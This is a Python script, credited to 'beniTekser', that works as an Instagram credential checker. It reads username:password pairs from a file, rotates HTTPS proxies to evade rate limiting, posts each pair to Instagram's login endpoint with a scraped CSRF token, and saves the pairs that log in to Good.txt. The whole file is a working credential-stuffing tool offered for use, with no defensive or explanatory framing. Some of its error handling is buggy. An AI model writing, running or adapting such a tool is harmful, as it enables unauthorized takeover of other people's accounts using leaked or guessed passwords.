from requests import Session
from datetime import datetime
from termcolor import colored
from re import findall
from os import system

system("cls")

print(f"{colored('Note that the proxies are https and all are active!','red')}")

Consent = str(input("Are there more proxies than usernames and passwords? y/n : "))

if 'y' in Consent :
    pass
else:
    system("cls")
    print(f"\n{colored('Please increase the proxies and then run the program again !','red')}")
    exit()

try:
    file = open("info.txt","r")
except:
    system("cls")
    print(f"\n{colored('Error! info.txt file does not exist','red')}")
    exit()

try:
    proxy = open("Https.txt","r")
except:
    system("cls")
    print(f"\n{colored('Error! Https.txt file does not exist','red')}")
    exit()






for UserPass in file.readlines():
    info = UserPass.split(":")
    Username = info[0]
    Password = info[1]
    Proxy = proxy.readline()

    if len(Proxy) > 0:

        def Login(Username,Password,Proxy):
            try:
                print(f"\n{colored('Start : ','green')} {Username}:{Password}")

                proxyDict = {
                    "https": f"http://{Proxy}",
                }

                link = 'https://www.instagram.com/accounts/login/'
                login_url = 'https://www.instagram.com/accounts/login/ajax/'

                time = int(datetime.now().timestamp())

                payload = {
                    'username': Username,
                    'enc_password': f'#PWD_INSTAGRAM_BROWSER:0:{time}:{Password}',
                    'queryParams': {},
                    'optIntoOneTap': 'false'
                }

                with Session() as s:
                    result = s.get(link)
                    csrf = findall(r"csrf_token\":\"(.*?)\"",result.text)[0]
                    result = s.post(login_url,timeout=(100000),proxies=proxyDict,data=payload,headers={
                        "user-agent": "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36",
                        "x-requested-with": "XMLHttpRequest",
                        "referer": "https://www.instagram.com/accounts/login/",
                        "x-csrftoken":csrf
                    })
                    if result.json()["authenticated"]:
                        print(f"\n{colored('Good :','green')} {colored(f'{Username}','blue')}:{colored(f'{Password}','red')}")
                        with open("Good.txt","a") as goods:
                            goods.write(f"\n{Username}:{Password}")
                    else:
                        print(f"{colored('\nNot Good : ','red')} {Username}:{Password}")

            except Exception as Error:
                if "ProxyError":
                    print(f"{colored('Proxy Error : ','red')} {Proxy}")
                else:
                    print(f"{colored('Error : ','red')} {Error}")

        Login(Username, Password, Proxy)


    else:
        def Login(Username, Password):
            try:
                print(f"\n{colored('Start : ', 'green')} {Username}:{Password}")


                link = 'https://www.instagram.com/accounts/login/'
                login_url = 'https://www.instagram.com/accounts/login/ajax/'

                time = int(datetime.now().timestamp())

                payload = {
                    'username': Username,
                    'enc_password': f'#PWD_INSTAGRAM_BROWSER:0:{time}:{Password}',
                    'queryParams': {},
                    'optIntoOneTap': 'false'
                }

                with Session() as s:
                    result = s.get(link)
                    csrf = findall(r"csrf_token\":\"(.*?)\"", result.text)[0]
                    result = s.post(login_url, data=payload, headers={
                        "user-agent": "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36",
                        "x-requested-with": "XMLHttpRequest",
                        "referer": "https://www.instagram.com/accounts/login/",
                        "x-csrftoken": csrf
                    })
                    if result.json()["authenticated"]:
                        print(
                            f"{colored('Good :', 'green')} {colored(f'{Username}', 'blue')}:{colored(f'{Password}', 'red')}")
                        with open("Good.txt", "a") as goods:
                            goods.write(f"\n{Username}:{Password}")
                    else:
                        print(f"{colored('Not Good : ', 'red')} {Username}:{Password}")

            except Exception as Error:
                print(f"{colored('Error : ', 'red')} {Error}")


        Login(Username, Password)

# The Writer : beniTekser